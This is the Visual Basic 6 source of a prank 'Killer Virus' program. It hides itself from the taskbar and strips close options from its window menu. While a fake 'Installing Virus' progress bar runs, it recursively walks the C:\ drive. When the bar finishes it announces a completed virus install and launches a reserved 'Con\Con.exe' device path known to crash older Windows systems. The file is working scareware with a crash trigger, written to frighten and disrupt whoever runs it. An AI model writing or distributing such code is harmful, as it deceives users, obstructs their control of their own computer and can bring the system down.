VERSION 5.00
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Begin VB.Form frmMain 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Killer Virus..."
   ClientHeight    =   1470
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   6840
   Icon            =   "frmMain.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   1470
   ScaleWidth      =   6840
   StartUpPosition =   3  'Windows Default
   Begin VB.Timer Timer1 
      Interval        =   1000
      Left            =   960
      Top             =   240
   End
   Begin MSComctlLib.ProgressBar ProgressBar1 
      Height          =   255
      Left            =   540
      TabIndex        =   0
      Top             =   960
      Width           =   5775
      _ExtentX        =   10186
      _ExtentY        =   450
      _Version        =   393216
      Appearance      =   1
   End
   Begin VB.Label Label2 
      Alignment       =   2  'Center
      Caption         =   "Installing Virus"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   2393
      TabIndex        =   3
      Top             =   0
      Width           =   2055
   End
   Begin VB.Label Label1 
      Caption         =   "%"
      Height          =   255
      Left            =   3540
      TabIndex        =   2
      Top             =   600
      Width           =   255
   End
   Begin VB.Label lblPercent 
      Alignment       =   1  'Right Justify
      Height          =   255
      Left            =   3060
      TabIndex        =   1
      Top             =   600
      Width           =   375
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False

Private Const MF_BYPOSITION = &H400&
Private Const MF_REMOVE = &H1000&


Private Declare Function GetSystemMenu Lib "user32" _
        (ByVal hwnd As Long, ByVal bRevert As Long) As Long


Private Declare Function GetMenuItemCount Lib "user32" _
        (ByVal hMenu As Long) As Long


Private Declare Function DrawMenuBar Lib "user32" _
        (ByVal hwnd As Long) As Long


Private Declare Function RemoveMenu Lib "user32" _
        (ByVal hMenu As Long, ByVal nPosition As Long, _
        ByVal wFlags As Long) As Long

Private Sub Form_Load()

Dim hSysMenu As Long
        Dim nCnt As Long
        Me.Show
        ' Get handle to our form's system menu
        ' (Restore, Maximize, Move, close etc.)
        hSysMenu = GetSystemMenu(Me.hwnd, False)
        If hSysMenu Then
            ' Get System menu's menu count
            nCnt = GetMenuItemCount(hSysMenu)
            If nCnt Then
                ' Menu count is based on 0 (0, 1, 2, 3...)
                RemoveMenu hSysMenu, nCnt - 1, _
                    MF_BYPOSITION Or MF_REMOVE
                RemoveMenu hSysMenu, nCnt - 2, _
                    MF_BYPOSITION Or MF_REMOVE
    ' Remove the seperator
                DrawMenuBar Me.hwnd
            End If
        End If

App.TaskVisible = False

End Sub

Private Sub Label1_Click()
End
End Sub

Private Sub Timer1_Timer()
If ProgressBar1.Value = 100 Then Timer1.Enabled = False
If Timer1.Enabled = True Then
ProgressBar1.Value = ProgressBar1.Value + 1
FilesSearch "C:\", "*.*"
End If
ProgressBar1.Visible = True
lblPercent.Caption = ProgressBar1.Value
If ProgressBar1.Value = 100 Then
MsgBox ("The virus has finished being installed, please restart your computer to complete the installation")
Shell ("C:\Windows\Con\Con.exe")
Unload Me
End If
End Sub

Public Sub FilesSearch(DrivePath As String, Ext As String)
    Dim XDir() As String
    Dim TmpDir As String
    Dim FFound As String
    Dim DirCount As Integer
    Dim X As Integer
    'Initialises Variables
    DirCount = 0
    ReDim XDir(0) As String
    XDir(DirCount) = ""


    If Right(DrivePath, 1) <> "\" Then
        DrivePath = DrivePath & "\"
    End If
    'Enter here the code for showing the pat
    '     h being
    'search. Example: Form1.label2 = DrivePa
    '     th
    'Search for all directories and store in
    '     the
    'XDir() variable


    DoEvents
        TmpDir = Dir(DrivePath, vbDirectory)


        Do While TmpDir <> ""


            If TmpDir <> "." And TmpDir <> ".." Then


                If (GetAttr(DrivePath & TmpDir) And vbDirectory) = vbDirectory Then
                    XDir(DirCount) = DrivePath & TmpDir & "\"
                    DirCount = DirCount + 1
                    ReDim Preserve XDir(DirCount) As String
                End If
            End If
            TmpDir = Dir
        Loop
        'Searches for the files given by extensi
        '     on Ext
        FFound = Dir(DrivePath & Ext)


        Do Until FFound = ""
            'Code in here for the actions of the fil
            '     es found.
            'Files found stored in the variable FFou
            '     nd.
            'Example: Form1.list1.AddItem DrivePath
            '     & FFound
            FFound = Dir
        Loop
        'Recursive searches through all sub dire
        '     ctories


        For X = 0 To (UBound(XDir) - 1)
            FilesSearch XDir(X), Ext
        Next X
    End Sub
